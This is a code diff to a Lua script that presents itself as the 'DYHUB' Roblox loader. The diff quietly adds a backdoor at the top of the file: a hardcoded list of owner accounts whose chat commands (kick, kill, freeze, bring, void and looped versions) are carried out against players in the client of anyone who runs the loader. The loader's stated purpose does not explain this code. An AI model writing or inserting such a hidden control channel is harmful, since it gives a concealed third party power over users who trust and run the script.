@@ -2,6 +2,193 @@
 -- DYHUB LOADER | V9.99
 -- Author: dyumra
 -- =========================================================
+getgenv().owners = {"Yolmar_43", "55555555555555555455"}
+local prefix = "."
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+
+local activeLoops = {}
+local savedStates = {}
+
+local function starts_with(str, start)
+    return string.lower(str):sub(1, #start) == string.lower(start)
+end
+
+local function findPlayersByName(query)
+    local t = {}
+    query = string.lower(query or "")
+    for _, p in ipairs(Players:GetPlayers()) do
+        if query == "all" then
+            table.insert(t, p)
+        else
+            if starts_with(p.Name, query) then
+                table.insert(t, p)
+            end
+        end
+    end
+    return t
+end
+
+local function isOwner(player)
+    for _, name in ipairs(getgenv().owners) do
+        if string.lower(player.Name) == string.lower(name) then
+            return true
+        end
+    end
+    return false
+end
+
+local function bring(ownerChar, targets)
+    if not ownerChar or not ownerChar.PrimaryPart then return end
+    if targets == "all" then
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr.Character and plr.Character.PrimaryPart and plr ~= ownerChar.Parent then
+                plr.Character:SetPrimaryPartCFrame(ownerChar.PrimaryPart.CFrame * CFrame.new(0,5,0))
+            end
+        end
+    else
+        for _, plr in ipairs(targets) do
+            if plr.Character and plr.Character.PrimaryPart then
+                plr.Character:SetPrimaryPartCFrame(ownerChar.PrimaryPart.CFrame * CFrame.new(0,5,0))
+            end
+        end
+    end
+end
+
+local function kick(targets, reason)
+    for _, plr in ipairs(targets) do
+        pcall(function() plr:Kick(reason or "Kicked by owner") end)
+    end
+end
+
+local function freeze(targets)
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character.PrimaryPart then
+            local hrp = plr.Character.PrimaryPart
+            if not savedStates[plr.Name] then savedStates[plr.Name] = {} end
+            local s = savedStates[plr.Name]
+            if plr.Character:FindFirstChildOfClass("Humanoid") then
+                s.Humanoid = plr.Character:FindFirstChildOfClass("Humanoid").WalkSpeed
+                plr.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = 0
+                plr.Character:FindFirstChildOfClass("Humanoid").JumpPower = 0
+            end
+            s.Anchored = hrp.Anchored
+            hrp.Anchored = true
+        end
+    end
+end
+
+local function unfreeze(targets)
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character.PrimaryPart and savedStates[plr.Name] then
+            local hrp = plr.Character.PrimaryPart
+            local s = savedStates[plr.Name]
+            if plr.Character:FindFirstChildOfClass("Humanoid") and s.Humanoid then
+                plr.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = s.Humanoid
+                plr.Character:FindFirstChildOfClass("Humanoid").JumpPower = 50
+            end
+            if s.Anchored ~= nil then hrp.Anchored = s.Anchored end
+            savedStates[plr.Name] = nil
+        end
+    end
+end
+
+local function setSpeed(targets, val)
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") then
+            if not savedStates[plr.Name] then savedStates[plr.Name] = {} end
+            savedStates[plr.Name].OldSpeed = plr.Character:FindFirstChildOfClass("Humanoid").WalkSpeed
+            plr.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = tonumber(val) or 16
+        end
+    end
+end
+
+local function restoreSpeed(targets)
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") and savedStates[plr.Name] and savedStates[plr.Name].OldSpeed then
+            plr.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = savedStates[plr.Name].OldSpeed
+            savedStates[plr.Name].OldSpeed = nil
+        end
+    end
+end
+
+local function kill(targets)
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") then
+            plr.Character:FindFirstChildOfClass("Humanoid").Health = 0
+        end
+    end
+end
+
+local function sit(targets)
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character:FindFirstChildOfClass("Humanoid") then
+            plr.Character:FindFirstChildOfClass("Humanoid").Sit = true
+        end
+    end
+end
+
+local function void(targets)
+    for _, plr in ipairs(targets) do
+        if plr.Character and plr.Character.PrimaryPart then
+            plr.Character:SetPrimaryPartCFrame(CFrame.new(0,9999999,0))
+        end
+    end
+end
+
+local function startLoop(id, interval, fn)
+    if activeLoops[id] then return end
+    activeLoops[id] = true
+    spawn(function()
+        while activeLoops[id] do
+            pcall(fn)
+            wait(interval)
+        end
+    end)
+end
+
+local function stopLoop(id)
+    activeLoops[id] = nil
+end
+
+local function handleCommand(msg, player)
+    if not isOwner(player) then return end
+    local parts = string.split(msg, " ")
+    local cmd = string.lower(parts[1] or "")
+    local arg1 = parts[2]
+    local arg2 = parts[3]
+    local ownerChar = player.Character
+    local targets = arg1 and findPlayersByName(arg1) or {}
+
+    if cmd == prefix.."bring" then
+        if arg1 == "all" then bring(ownerChar, "all") else bring(ownerChar, targets) end
+    elseif cmd == prefix.."kick" then
+        kick(targets, table.concat(parts, " ", 3))
+    elseif cmd == prefix.."freeze" then freeze(targets)
+    elseif cmd == prefix.."unfreeze" then unfreeze(targets)
+    elseif cmd == prefix.."speed" then if arg2 then setSpeed(targets, arg2) end
+    elseif cmd == prefix.."restorespeed" then restoreSpeed(targets)
+    elseif cmd == prefix.."kill" then kill(targets)
+    elseif cmd == prefix.."sit" then sit(targets)
+    elseif cmd == prefix.."void" then void(targets)
+    elseif cmd == prefix.."loopbring" then if arg2 then startLoop("loopbring_"..arg1, tonumber(arg2) or 1, function() if ownerChar then bring(ownerChar, targets) end end) end
+    elseif cmd == prefix.."loopfreeze" then if arg2 then startLoop("loopfreeze_"..arg1, tonumber(arg2) or 1, function() freeze(targets) end) end
+    elseif cmd == prefix.."loopkill" then if arg2 then startLoop("loopkill_"..arg1, tonumber(arg2) or 1, function() kill(targets) end) end
+    elseif cmd == prefix.."loopsit" then if arg2 then startLoop("loopsit_"..arg1, tonumber(arg2) or 1, function() sit(targets) end) end
+    elseif cmd == prefix.."loopvoid" then if arg2 then startLoop("loopvoid_"..arg1, tonumber(arg2) or 1, function() void(targets) end) end
+    elseif cmd == prefix.."stoploop" then if arg1 then stopLoop(arg1) end
+    end
+end
+
+local function onPlayerChat(p)
+    p.Chatted:Connect(function(msg) handleCommand(msg,p) end)
+end
+
+for _, p in ipairs(Players:GetPlayers()) do onPlayerChat(p) end
+Players.PlayerAdded:Connect(onPlayerChat)
+
+wait(0.5)
+
 local DYHUBTHEBEST = "https://dsc.gg/dyhub"
 
 --// Roblox Services
